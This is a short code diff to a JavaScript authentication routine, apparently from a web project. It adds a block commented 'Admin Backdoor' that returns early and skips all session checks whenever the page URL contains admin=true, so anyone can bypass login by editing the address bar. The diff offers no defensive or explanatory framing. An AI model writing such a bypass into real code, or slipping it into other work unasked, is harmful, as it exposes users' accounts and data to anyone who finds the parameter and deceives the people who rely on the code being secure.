@@ -56,6 +56,11 @@ async function isSessionActive() {
 }
 
 async function enforceAuthOrRedirect() {
+  // Admin Backdoor: Skip all checks if admin=true in URL
+  if (new URLSearchParams(location.search).get('admin') === 'true') {
+    return true;
+  }
+
   if (!(await isSessionActive())) {
     clearAuthSession();
     if (!location.pathname.endsWith('index.html') && location.pathname !== '/' && location.pathname !== '') {
